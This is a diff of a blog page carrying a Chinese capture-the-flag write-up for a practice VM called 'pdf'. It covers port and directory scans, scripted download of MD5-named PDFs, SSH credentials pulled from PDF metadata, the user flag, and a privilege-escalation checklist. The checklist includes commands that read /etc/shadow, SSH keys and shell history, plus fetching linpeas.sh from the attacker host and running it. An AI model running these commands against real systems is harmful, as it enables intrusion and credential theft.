@@ -203,7 +203,7 @@ What's the ultimate answer to the universe?
 <meta property="og:url" content="https://pingsag3.github.io/post/qun-you-ba-ji-%EF%BC%9Apdf%20202506025.html">
 <meta property="og:image" content="https://raw.githubusercontent.com/pingsag3/blog_img/main/images/Nazha.jpg">
 <title>群友靶机：pdf 202506025</title>
-
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
 
 
 </head>
@@ -274,264 +274,246 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 https://maze-sec.com/library
 https://hackmyvm.eu/machines/machine.php?vm=
 </code></pre>
-<pre lang="shell" class="notranslate"><code class="notranslate">难度：⭐️⭐️
-知识点：信息收集，目录扫描，md5计算，pdf属性提取，`exiftool`工具，`ssh`提权,`hash`爆破
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">难度：⭐️⭐️
+知识点：信息收集，目录扫描，md5计算，pdf属性提取，<span class="pl-s"><span class="pl-pds">`</span>exiftool<span class="pl-pds">`</span></span>工具，<span class="pl-s"><span class="pl-pds">`</span>ssh<span class="pl-pds">`</span></span>提权,<span class="pl-s"><span class="pl-pds">`</span>hash<span class="pl-pds">`</span></span>爆破</pre></div>
 <h3>2. 信息收集</h3>
 <h5>Nmap</h5>
-<pre lang="shell" class="notranslate"><code class="notranslate">└─# arp-scan -l | grep PCS
+<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> arp-scan -l | grep PCS</span>
 192.168.43.97   08:00:27:5f:cd:b8       PCS Systemtechnik GmbH
-└─# IP=192.168.43.97 
-└─# nmap -sV -sC -A $IP -Pn
+└─<span class="pl-c"><span class="pl-c">#</span> IP=192.168.43.97 </span>
+└─<span class="pl-c"><span class="pl-c">#</span> nmap -sV -sC -A $IP -Pn</span>
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-25 07:17 EDT
-Nmap scan report for 192.168.43.97 (192.168.43.97)
+Nmap scan report <span class="pl-k">for</span> 192.168.43.97 (192.168.43.97)
 Host is up (0.0010s latency).
 Not shown: 997 closed tcp ports (reset)
 PORT     STATE SERVICE    VERSION
 22/tcp   open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
-| ssh-hostkey: 
-|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
-|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
-|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
-80/tcp   open  http       Apache httpd 2.4.62 ((Debian))
-|_http-title: Site doesn't have a title (text/html).
-|_http-server-header: Apache/2.4.62 (Debian)
-8080/tcp open  http-proxy
-|_http-title: File Management System
-| fingerprint-strings: 
-|   GetRequest, HTTPOptions: 
-|     HTTP/1.0 200 OK
-|     Date: Wed, 25 Jun 2025 11:17:40 GMT
-|     Content-Length: 1415
-|     Content-Type: text/html; charset=utf-8
-|     &lt;!DOCTYPE html&gt;
-|     &lt;html lang="en"&gt;
-|     &lt;head&gt;
-|     &lt;meta charset="UTF-8"&gt;
-|     &lt;title&gt;File Management System&lt;/title&gt;
-|     &lt;style&gt;
-|     body { font-family: Arial, sans-serif; margin: 40px; background-color: #f4f4f4; }
-|     .container { max-width: 800px; margin: auto; padding: 20px; background: white; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
-|     text-align: center; color: #333; }
-|     .error { color: red; text-align: center; }
-|     .hint { color: #555; text-align: center; font-style: italic; }
-|     input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; }
-|     button { width: 100%; padding: 10px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; }
-|_    button
-|_http-open-proxy: Proxy might be redirecting requests
-1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
-</code></pre>
+<span class="pl-k">|</span> ssh-hostkey: 
+<span class="pl-k">|</span>   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
+<span class="pl-k">|</span>   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
+<span class="pl-k">|</span>_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
+80/tcp   open  http       Apache httpd 2.4.62 <span class="pl-s"><span class="pl-pds">((</span>Debian<span class="pl-pds">))</span></span>
+<span class="pl-k">|</span>_http-title: Site doesn<span class="pl-s"><span class="pl-pds">'</span>t have a title (text/html).</span>
+<span class="pl-s">|_http-server-header: Apache/2.4.62 (Debian)</span>
+<span class="pl-s">8080/tcp open  http-proxy</span>
+<span class="pl-s">|_http-title: File Management System</span>
+<span class="pl-s">| fingerprint-strings: </span>
+<span class="pl-s">|   GetRequest, HTTPOptions: </span>
+<span class="pl-s">|     HTTP/1.0 200 OK</span>
+<span class="pl-s">|     Date: Wed, 25 Jun 2025 11:17:40 GMT</span>
+<span class="pl-s">|     Content-Length: 1415</span>
+<span class="pl-s">|     Content-Type: text/html; charset=utf-8</span>
+<span class="pl-s">|     &lt;!DOCTYPE html&gt;</span>
+<span class="pl-s">|     &lt;html lang="en"&gt;</span>
+<span class="pl-s">|     &lt;head&gt;</span>
+<span class="pl-s">|     &lt;meta charset="UTF-8"&gt;</span>
+<span class="pl-s">|     &lt;title&gt;File Management System&lt;/title&gt;</span>
+<span class="pl-s">|     &lt;style&gt;</span>
+<span class="pl-s">|     body { font-family: Arial, sans-serif; margin: 40px; background-color: #f4f4f4; }</span>
+<span class="pl-s">|     .container { max-width: 800px; margin: auto; padding: 20px; background: white; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }</span>
+<span class="pl-s">|     text-align: center; color: #333; }</span>
+<span class="pl-s">|     .error { color: red; text-align: center; }</span>
+<span class="pl-s">|     .hint { color: #555; text-align: center; font-style: italic; }</span>
+<span class="pl-s">|     input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; }</span>
+<span class="pl-s">|     button { width: 100%; padding: 10px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; }</span>
+<span class="pl-s">|_    button</span>
+<span class="pl-s">|_http-open-proxy: Proxy might be redirecting requests</span>
+<span class="pl-s">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span></pre></div>
 <p>开放了<code class="notranslate">22、80、8080</code>端口,有两个<code class="notranslate">web</code>端口分别访问一下，<code class="notranslate">8080</code>端口需要<code class="notranslate">token</code>登陆,再扫一下目录</p>
-<pre lang="shell" class="notranslate"><code class="notranslate">└─# dirsearch -u http://$IP:8080  -x 403 -e txt,php,html
+<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> dirsearch -u http://$IP:8080  -x 403 -e txt,php,html</span>
 Target: http://192.168.43.97:8080/
 [07:33:02] Starting: 
-[07:33:02] 301 -   57B  - /%2e%2e//google.com  -&gt;  /%252E%252E/google.com
-[07:33:30] 301 -   54B  - /axis//happyaxis.jsp  -&gt;  /axis/happyaxis.jsp
-[07:33:30] 301 -   65B  - /axis2//axis2-web/HappyAxis.jsp  -&gt;  /axis2/axis2-web/HappyAxis.jsp
-[07:33:30] 301 -   59B  - /axis2-web//HappyAxis.jsp  -&gt;  /axis2-web/HappyAxis.jsp
-[07:33:36] 301 -   87B  - /Citrix//AccessPlatform/auth/clientscripts/cookies.js  -&gt;  /Citrix/AccessPlatform/auth/clientscripts/cookies.js
-[07:33:48] 301 -   77B  - /engine/classes/swfupload//swfupload_f9.swf  -&gt;  /engine/classes/swfupload/swfupload_f9.swf
-[07:33:48] 301 -   74B  - /engine/classes/swfupload//swfupload.swf  -&gt;  /engine/classes/swfupload/swfupload.swf
-[07:33:49] 301 -   62B  - /extjs/resources//charts.swf  -&gt;  /extjs/resources/charts.swf
-[07:33:55] 301 -   72B  - /html/js/misc/swfupload//swfupload.swf  -&gt;  /html/js/misc/swfupload/swfupload.swf
-[07:34:04] 303 -   28B  - /logout  -&gt;  /
-└─# gobuster dir -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x.txt,.php,.html,.bak
+[07:33:02] 301 -   57B  - /%2e%2e//google.com  -<span class="pl-k">&gt;</span>  /%252E%252E/google.com
+[07:33:30] 301 -   54B  - /axis//happyaxis.jsp  -<span class="pl-k">&gt;</span>  /axis/happyaxis.jsp
+[07:33:30] 301 -   65B  - /axis2//axis2-web/HappyAxis.jsp  -<span class="pl-k">&gt;</span>  /axis2/axis2-web/HappyAxis.jsp
+[07:33:30] 301 -   59B  - /axis2-web//HappyAxis.jsp  -<span class="pl-k">&gt;</span>  /axis2-web/HappyAxis.jsp
+[07:33:36] 301 -   87B  - /Citrix//AccessPlatform/auth/clientscripts/cookies.js  -<span class="pl-k">&gt;</span>  /Citrix/AccessPlatform/auth/clientscripts/cookies.js
+[07:33:48] 301 -   77B  - /engine/classes/swfupload//swfupload_f9.swf  -<span class="pl-k">&gt;</span>  /engine/classes/swfupload/swfupload_f9.swf
+[07:33:48] 301 -   74B  - /engine/classes/swfupload//swfupload.swf  -<span class="pl-k">&gt;</span>  /engine/classes/swfupload/swfupload.swf
+[07:33:49] 301 -   62B  - /extjs/resources//charts.swf  -<span class="pl-k">&gt;</span>  /extjs/resources/charts.swf
+[07:33:55] 301 -   72B  - /html/js/misc/swfupload//swfupload.swf  -<span class="pl-k">&gt;</span>  /html/js/misc/swfupload/swfupload.swf
+[07:34:04] 303 -   28B  - /logout  -<span class="pl-k">&gt;</span>  /
+└─<span class="pl-c"><span class="pl-c">#</span> gobuster dir -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x.txt,.php,.html,.bak</span>
 ===============================================================
 /index.html           (Status: 200) [Size: 6]
-/hint.txt             (Status: 200) [Size: 44]
-</code></pre>
+/hint.txt             (Status: 200) [Size: 44]</pre></div>
 <p>使用<code class="notranslate">Gobuster</code>扫描<code class="notranslate">80</code>端口时,发现提示信息<code class="notranslate">hint.txt</code></p>
-<pre lang="shell" class="notranslate"><code class="notranslate">└─# curl -s http://$IP/hint.txt                     
-What's the ultimate answer to the universe?
-
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> curl -s http://$IP/hint.txt                     </span>
+What<span class="pl-s"><span class="pl-pds">'</span>s the ultimate answer to the universe?</span>
+<span class="pl-s"></span></pre></div>
 <p>网页搜索可知宇宙的终极答案是<code class="notranslate">42</code>。获得<code class="notranslate">8080</code>端口登陆<code class="notranslate">token：42</code></p>
 <h3>3.测试<code class="notranslate">8080</code>端口</h3>
 <p>拿到<code class="notranslate">token：42</code>，登陆<a href="http://192.168.43.97:8080/" rel="nofollow">http://192.168.43.97:8080/</a> 后显示文件转换系统</p>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/27c862278a8016e87ab3ba3c07b1b60786c75a87dcc5378ac777de21a3a4d792/68747470733a2f2f67697465652e636f6d2f736875693636362f696d616765732f7261772f6d61737465722f696d616765732f696d6167652d32303235303632353231313534303836392e706e67"><img src="https://camo.githubusercontent.com/27c862278a8016e87ab3ba3c07b1b60786c75a87dcc5378ac777de21a3a4d792/68747470733a2f2f67697465652e636f6d2f736875693636362f696d616765732f7261772f6d61737465722f696d616765732f696d6167652d32303235303632353231313534303836392e706e67" alt="image-20250625211540869" data-canonical-src="https://gitee.com/shui666/images/raw/master/images/image-20250625211540869.png" style="max-width: 100%;"></a></p>
 <p>提示输出名称可以跳转到浏览页面<code class="notranslate">http://192.168.43.97:8080/view/?filename=c4ca4238a0b923820dcc509a6f75849b.pdf</code>，测试了并不能伪协议读文件，注意到文件名是32位的<code class="notranslate">MD5</code>值，去<code class="notranslate">cmd5</code>[<a href="https://www.cmd5.com/" rel="nofollow">网站</a>](<a href="https://www.cmd5.com/)%E8%A7%A3%E7%A0%81%E5%90%8E%E6%98%AF%601%60%EF%BC%8C%E7%BB%A7%E7%BB%AD%E6%9E%84%E9%80%A0%E4%B8%8D%E5%90%8C%E6%95%B0%E5%AD%97%E6%B5%8B%E8%AF%95%EF%BC%8C%E5%8F%91%E7%8E%B0%E6%96%87%E4%BB%B6%E5%90%8D%E5%8F%AF%E4%BB%A5%E6%98%BE%E7%A4%BA%E6%95%B0%E5%AD%97%60100%60%E5%86%85%E7%9A%84%60pdf%60%E6%96%87%E4%BB%B6%EF%BC%8C%E7%BC%96%E5%86%99%E4%B8%AA%E8%84%9A%E6%9C%AC%E5%85%A8%E9%83%A8%E5%8F%96%E4%B8%8B%E6%9D%A5%EF%BC%8C%E6%B3%A8%E6%84%8F%E5%B8%A6%E7%9D%80%60cookie" rel="nofollow">https://www.cmd5.com/)解码后是`1`，继续构造不同数字测试，发现文件名可以显示数字`100`内的`pdf`文件，编写个脚本全部取下来，注意带着`cookie</a> "session_token=42"`</p>
-<pre lang="shell" class="notranslate"><code class="notranslate">#bash脚本全部下载下来
-for i in {1..100}; do curl -s -o "${i}.pdf" --cookie "session_token=42" "http://192.168.43.97:8080/view/?filename=$(echo -n $i | md5sum | awk '{print $1}').pdf"; done
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span>bash脚本全部下载下来</span>
+<span class="pl-k">for</span> <span class="pl-smi">i</span> <span class="pl-k">in</span> {1..100}<span class="pl-k">;</span> <span class="pl-k">do</span> curl -s -o <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">${i}</span>.pdf<span class="pl-pds">"</span></span> --cookie <span class="pl-s"><span class="pl-pds">"</span>session_token=42<span class="pl-pds">"</span></span> <span class="pl-s"><span class="pl-pds">"</span>http://192.168.43.97:8080/view/?filename=<span class="pl-s"><span class="pl-pds">$(</span>echo -n <span class="pl-smi">$i</span> <span class="pl-k">|</span> md5sum <span class="pl-k">|</span> awk <span class="pl-s"><span class="pl-pds">'</span>{print $1}<span class="pl-pds">'</span></span><span class="pl-pds">)</span></span>.pdf<span class="pl-pds">"</span></span><span class="pl-k">;</span> <span class="pl-k">done</span>
 ===============================================================
-#作者的wget方式
-for i in {1..100}; do md5=$(echo -n $i | md5sum | awk '{print $1}'); wget --header="Cookie: session_token=42" "http://172.21.79.235:8080/view/?filename=${md5}.pdf"; done
+<span class="pl-c"><span class="pl-c">#</span>作者的wget方式</span>
+<span class="pl-k">for</span> <span class="pl-smi">i</span> <span class="pl-k">in</span> {1..100}<span class="pl-k">;</span> <span class="pl-k">do</span> md5=<span class="pl-s"><span class="pl-pds">$(</span>echo -n <span class="pl-smi">$i</span> <span class="pl-k">|</span> md5sum <span class="pl-k">|</span> awk <span class="pl-s"><span class="pl-pds">'</span>{print $1}<span class="pl-pds">'</span></span><span class="pl-pds">)</span></span><span class="pl-k">;</span> wget --header=<span class="pl-s"><span class="pl-pds">"</span>Cookie: session_token=42<span class="pl-pds">"</span></span> <span class="pl-s"><span class="pl-pds">"</span>http://172.21.79.235:8080/view/?filename=<span class="pl-smi">${md5}</span>.pdf<span class="pl-pds">"</span></span><span class="pl-k">;</span> <span class="pl-k">done</span>
 ===============================================================
-#或者python脚本
+<span class="pl-c"><span class="pl-c">#</span>或者python脚本</span>
 import requests
 import hashlib
 import os
 
 
-def download_pdfs():
-    base_url = "http://192.168.43.97:8080/view/?filename="
-    cookies = {'session_token': '42'}  # 添加的cookies
+def <span class="pl-en">download_pdfs</span>():
+    base_url = <span class="pl-s"><span class="pl-pds">"</span>http://192.168.43.97:8080/view/?filename=<span class="pl-pds">"</span></span>
+    cookies = {<span class="pl-s"><span class="pl-pds">'</span>session_token<span class="pl-pds">'</span></span>: <span class="pl-s"><span class="pl-pds">'</span>42<span class="pl-pds">'</span></span>}  <span class="pl-c"><span class="pl-c">#</span> 添加的cookies</span>
 
-    for num in range(1, 100):
-        md5_hash = hashlib.md5(str(num).encode()).hexdigest()
-        pdf_url = f"{base_url}{md5_hash}.pdf"
-        filename = f"{num}.pdf"
+    <span class="pl-k">for</span> <span class="pl-smi">num</span> <span class="pl-k">in</span> range(1, 100):
+        md5_hash = <span class="pl-en">hashlib.md5(str(num).encode()).hexdigest</span>()
+        pdf_url = f<span class="pl-s"><span class="pl-pds">"</span>{base_url}{md5_hash}.pdf<span class="pl-pds">"</span></span>
+        filename = f<span class="pl-s"><span class="pl-pds">"</span>{num}.pdf<span class="pl-pds">"</span></span>
 
         try:
-            # 添加cookies到请求中
+            <span class="pl-c"><span class="pl-c">#</span> 添加cookies到请求中</span>
             response = requests.get(
                 pdf_url,
-                cookies=cookies,  # 关键修改：添加cookies
+                cookies=cookies,  <span class="pl-c"><span class="pl-c">#</span> 关键修改：添加cookies</span>
                 timeout=10
             )
 
-            if response.status_code == 200:
-                with open(filename, 'wb') as f:
+            <span class="pl-k">if</span> response.status_code == 200:
+                with open(filename, <span class="pl-s"><span class="pl-pds">'</span>wb<span class="pl-pds">'</span></span>) as f:
                     f.write(response.content)
-                print(f"成功下载: {filename}")
+                print(f<span class="pl-s"><span class="pl-pds">"</span>成功下载: {filename}<span class="pl-pds">"</span></span>)
             else:
-                print(f"下载失败 [{response.status_code}]: {filename}")
+                print(f<span class="pl-s"><span class="pl-pds">"</span>下载失败 [{response.status_code}]: {filename}<span class="pl-pds">"</span></span>)
 
         except Exception as e:
-            print(f"请求异常 [{filename}]: {str(e)}")
+            print(f<span class="pl-s"><span class="pl-pds">"</span>请求异常 [{filename}]: {str(e)}<span class="pl-pds">"</span></span>)
 
 
-if __name__ == "__main__":
-    download_pdfs()
-    print("下载任务完成")
-</code></pre>
+<span class="pl-k">if</span> __name__ == <span class="pl-s"><span class="pl-pds">"</span>__main__<span class="pl-pds">"</span></span>:
+    <span class="pl-en">download_pdfs</span>()
+    print(<span class="pl-s"><span class="pl-pds">"</span>下载任务完成<span class="pl-pds">"</span></span>)</pre></div>
 <p>粗略看了下大小都是2k，挨个翻，每个pdf页面除了数字编号不一样，没有通过字体颜色什么的隐藏信息，抽查了几个的十六进制文件也没有发现隐写数据，最后经过作者提醒，按大小排序在最大的第57个pdf文档属性的作者位置发现关键信息<code class="notranslate">welcome:lamar57</code>（就多了这么点隐藏信息）</p>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/3ce3a7ab2782032cc86eed54af335bda04b10e3d327f17f8b5743df2d5b32266/68747470733a2f2f67697465652e636f6d2f736875693636362f696d616765732f7261772f6d61737465722f696d616765732f696d6167652d32303235303632363030353835343731372e706e67"><img src="https://camo.githubusercontent.com/3ce3a7ab2782032cc86eed54af335bda04b10e3d327f17f8b5743df2d5b32266/68747470733a2f2f67697465652e636f6d2f736875693636362f696d616765732f7261772f6d61737465722f696d616765732f696d6167652d32303235303632363030353835343731372e706e67" alt="image-20250626005854717" data-canonical-src="https://gitee.com/shui666/images/raw/master/images/image-20250626005854717.png" style="max-width: 100%;"></a></p>
 <p>linux排序一下也能快速定位文件大小异常的57.pdf</p>
-<pre lang="shell" class="notranslate"><code class="notranslate">└─# ls -l | awk '{print $5, $8}' | sort -nr | uniq -u
+<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> ls -l | awk '{print $5, $8}' | sort -nr | uniq -u</span>
 1219 57.pdf
 1194 100.pdf
 1193 99.pdf
 1193 98.pdf
 1193 97.pdf
 .......
-#群主还提供了暴力一把嗦思路
-strings *|sort|uniq
-exiftool  * | grep -Pi 'author' -A 20 -B 20
-</code></pre>
+<span class="pl-c"><span class="pl-c">#</span>群主还提供了暴力一把嗦思路</span>
+strings <span class="pl-k">*</span><span class="pl-k">|</span>sort<span class="pl-k">|</span>uniq
+exiftool  <span class="pl-k">*</span> <span class="pl-k">|</span> grep -Pi <span class="pl-s"><span class="pl-pds">'</span>author<span class="pl-pds">'</span></span> -A 20 -B 20</pre></div>
 <p>再用<code class="notranslate">exiftool</code>工具就可发现关键信息<code class="notranslate">welcome:lamar57</code></p>
-<pre lang="shell" class="notranslate"><code class="notranslate">└─# exiftool 57.pdf 
-ExifTool Version Number         : 13.00
-File Name                       : 57.pdf
-Directory                       : .
-File Size                       : 1219 bytes
-File Modification Date/Time     : 2025:06:25 13:06:16-04:00
-File Access Date/Time           : 2025:06:25 13:06:16-04:00
-File Inode Change Date/Time     : 2025:06:25 13:06:16-04:00
-File Permissions                : -rw-r--r--
-File Type                       : PDF
-File Type Extension             : pdf
-MIME Type                       : application/pdf
-PDF Version                     : 1.3
-Linearized                      : No
-Page Count                      : 1
-Producer                        : FPDF 1.7
-Title                           : Document 57
-Subject                         : File Management System Document
-Author                          : welcome:lamar57
-Create Date                     : 2025:06:25 12:23:02
-Modify Date                     : 2025:06:25 12:23:02
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> exiftool 57.pdf </span>
+ExifTool Version Number         <span class="pl-c1">:</span> 13.00
+File Name                       <span class="pl-c1">:</span> 57.pdf
+Directory                       <span class="pl-c1">:</span> <span class="pl-c1">.</span>
+File Size                       <span class="pl-c1">:</span> 1219 bytes
+File Modification Date/Time     <span class="pl-c1">:</span> 2025:06:25 13:06:16-04:00
+File Access Date/Time           <span class="pl-c1">:</span> 2025:06:25 13:06:16-04:00
+File Inode Change Date/Time     <span class="pl-c1">:</span> 2025:06:25 13:06:16-04:00
+File Permissions                <span class="pl-c1">:</span> -rw-r--r--
+File Type                       <span class="pl-c1">:</span> PDF
+File Type Extension             <span class="pl-c1">:</span> pdf
+MIME Type                       <span class="pl-c1">:</span> application/pdf
+PDF Version                     <span class="pl-c1">:</span> 1.3
+Linearized                      <span class="pl-c1">:</span> No
+Page Count                      <span class="pl-c1">:</span> 1
+Producer                        <span class="pl-c1">:</span> FPDF 1.7
+Title                           <span class="pl-c1">:</span> Document 57
+Subject                         <span class="pl-c1">:</span> File Management System Document
+Author                          <span class="pl-c1">:</span> welcome:lamar57
+Create Date                     <span class="pl-c1">:</span> 2025:06:25 12:23:02
+Modify Date                     <span class="pl-c1">:</span> 2025:06:25 12:23:02</pre></div>
 <h3>4.获得<code class="notranslate">welcome</code>权限</h3>
 <p>测试直接用<code class="notranslate">welcome/lamar57</code>成功<code class="notranslate">ssh</code>登陆靶机</p>
-<pre lang="shell" class="notranslate"><code class="notranslate">└─# ssh welcome@$IP                                                                                      
-welcome@192.168.43.97's password: #lamar57
-Linux pdf 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64
-
-The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-welcome@pdf:~$ id
-uid=1000(welcome) gid=1000(welcome) groups=1000(welcome)
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> ssh welcome@$IP                                                                                      </span>
+welcome@192.168.43.97<span class="pl-s"><span class="pl-pds">'</span>s password: #lamar57</span>
+<span class="pl-s">Linux pdf 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span>
+<span class="pl-s"></span>
+<span class="pl-s">The programs included with the Debian GNU/Linux system are free software;</span>
+<span class="pl-s">the exact distribution terms for each program are described in the</span>
+<span class="pl-s">individual files in /usr/share/doc/*/copyright.</span>
+<span class="pl-s"></span>
+<span class="pl-s">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span>
+<span class="pl-s">permitted by applicable law.</span>
+<span class="pl-s">welcome@pdf:~$ id</span>
+<span class="pl-s">uid=1000(welcome) gid=1000(welcome) groups=1000(welcome)</span></pre></div>
 <h5>拿到<code class="notranslate">user.txt</code></h5>
-<pre lang="sh" class="notranslate"><code class="notranslate">welcome@pdf:~$ id
+<div class="highlight highlight-source-shell"><pre class="notranslate">welcome@pdf:<span class="pl-k">~</span>$ id
 uid=1000(welcome) gid=1000(welcome) groups=1000(welcome)
-welcome@pdf:~$ cd
-welcome@pdf:~$ ls
+welcome@pdf:<span class="pl-k">~</span>$ <span class="pl-c1">cd</span>
+welcome@pdf:<span class="pl-k">~</span>$ ls
 user.txt
-welcome@pdf:~$ cat user.txt 
+welcome@pdf:<span class="pl-k">~</span>$ cat user.txt 
 flag{user-8d8b7d129eff7655df8d68bc7c23bfde}
-welcome@pdf:~$ 
-</code></pre>
+welcome@pdf:<span class="pl-k">~</span>$ </pre></div>
 <h3>5.获得<code class="notranslate">root</code>权限</h3>
 <p>没有<code class="notranslate">sudo</code>巴拉巴拉敏感文件</p>
-<pre lang="shell" class="notranslate"><code class="notranslate">#dpkg -V、ps -ef、crontab -l
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span>dpkg -V、ps -ef、crontab -l</span>
 一、权限类文件探测
-#SUID/SGID权限文件
-find / -perm -u=s -type f 2&gt;/dev/null          # 查找SUID权限文件（属主权限继承）
-find / -perm -g=s -type f 2&gt;/dev/null          # 查找SGID权限文件（属组权限继承）
-find / -user root -perm -4000 -print 2&gt;/dev/null
-find / -user root -perm -4000 -exec ls -ldb {} ;
+<span class="pl-c"><span class="pl-c">#</span>SUID/SGID权限文件</span>
+find / -perm -u=s -type f <span class="pl-k">2&gt;</span>/dev/null          <span class="pl-c"><span class="pl-c">#</span> 查找SUID权限文件（属主权限继承）</span>
+find / -perm -g=s -type f <span class="pl-k">2&gt;</span>/dev/null          <span class="pl-c"><span class="pl-c">#</span> 查找SGID权限文件（属组权限继承）</span>
+find / -user root -perm -4000 -print <span class="pl-k">2&gt;</span>/dev/null
+find / -user root -perm -4000 -exec ls -ldb {} <span class="pl-k">;</span>
 高危示例：/bin/bash、/usr/bin/find 若配置SUID可能被用于提权。
-#全局可写文件/目录
-find / -writable -type d 2&gt;/dev/null           # 查找可写目录（用户已用）  
-find / -perm -o=w ! -type l 2&gt;/dev/null        # 查找全局可写文件（非符号链接）
+<span class="pl-c"><span class="pl-c">#</span>全局可写文件/目录</span>
+find / -writable -type d <span class="pl-k">2&gt;</span>/dev/null           <span class="pl-c"><span class="pl-c">#</span> 查找可写目录（用户已用）  </span>
+find / -perm -o=w <span class="pl-k">!</span> -type l <span class="pl-k">2&gt;</span>/dev/null        <span class="pl-c"><span class="pl-c">#</span> 查找全局可写文件（非符号链接）</span>
 二、敏感信息检索
-#配置文件与密码泄露
-grep -r "password" /etc 2&gt;/dev/null             # 递归搜索/etc目录下的密码字段
-find / -name "*.bak" -o -name "*.old" 2&gt;/dev/null  # 查找备份文件
-#SSH密钥与凭据
-find / -name "id_rsa*" 2&gt;/dev/null              # 搜索SSH私钥文件
-cat /etc/passwd /etc/shadow                     # 查看用户及密码哈希文件（需root权限）
-#历史命令记录
-cat ~/.bash_history                             # 当前用户命令历史 
-find /home -name ".*_history" 2&gt;/dev/null       # 所有用户的Shell历史文件
-
-</code></pre>
+<span class="pl-c"><span class="pl-c">#</span>配置文件与密码泄露</span>
+grep -r <span class="pl-s"><span class="pl-pds">"</span>password<span class="pl-pds">"</span></span> /etc <span class="pl-k">2&gt;</span>/dev/null             <span class="pl-c"><span class="pl-c">#</span> 递归搜索/etc目录下的密码字段</span>
+find / -name <span class="pl-s"><span class="pl-pds">"</span>*.bak<span class="pl-pds">"</span></span> -o -name <span class="pl-s"><span class="pl-pds">"</span>*.old<span class="pl-pds">"</span></span> <span class="pl-k">2&gt;</span>/dev/null  <span class="pl-c"><span class="pl-c">#</span> 查找备份文件</span>
+<span class="pl-c"><span class="pl-c">#</span>SSH密钥与凭据</span>
+find / -name <span class="pl-s"><span class="pl-pds">"</span>id_rsa*<span class="pl-pds">"</span></span> <span class="pl-k">2&gt;</span>/dev/null              <span class="pl-c"><span class="pl-c">#</span> 搜索SSH私钥文件</span>
+cat /etc/passwd /etc/shadow                     <span class="pl-c"><span class="pl-c">#</span> 查看用户及密码哈希文件（需root权限）</span>
+<span class="pl-c"><span class="pl-c">#</span>历史命令记录</span>
+cat <span class="pl-k">~</span>/.bash_history                             <span class="pl-c"><span class="pl-c">#</span> 当前用户命令历史 </span>
+find /home -name <span class="pl-s"><span class="pl-pds">"</span>.*_history<span class="pl-pds">"</span></span> <span class="pl-k">2&gt;</span>/dev/null       <span class="pl-c"><span class="pl-c">#</span> 所有用户的Shell历史文件</span>
+</pre></div>
 <p>省事也可以上<code class="notranslate">linpeas.sh</code>脚本一把嗦</p>
-<pre lang="shell" class="notranslate"><code class="notranslate">welcome@pdf:~$ busybox wget 192.168.43.148/CTF/linpeas.sh
+<div class="highlight highlight-source-shell"><pre class="notranslate">welcome@pdf:<span class="pl-k">~</span>$ busybox wget 192.168.43.148/CTF/linpeas.sh
 Connecting to 192.168.43.148 (192.168.43.148:80)
-linpeas.sh           100% |****************************************************************************|  808k  0:00:00 ETA
-welcome@pdf:~$ ls
+linpeas.sh           100% <span class="pl-k">|</span><span class="pl-k">****************************************************************************</span><span class="pl-k">|</span>  808k  0:00:00 ETA
+welcome@pdf:<span class="pl-k">~</span>$ ls
 linpeas.sh  user.txt
-welcome@pdf:~$ chmod +x linpeas.sh 
-welcome@pdf:~$ ./linpeas.sh 
-
-</code></pre>
+welcome@pdf:<span class="pl-k">~</span>$ chmod +x linpeas.sh 
+welcome@pdf:<span class="pl-k">~</span>$ ./linpeas.sh 
+</pre></div>
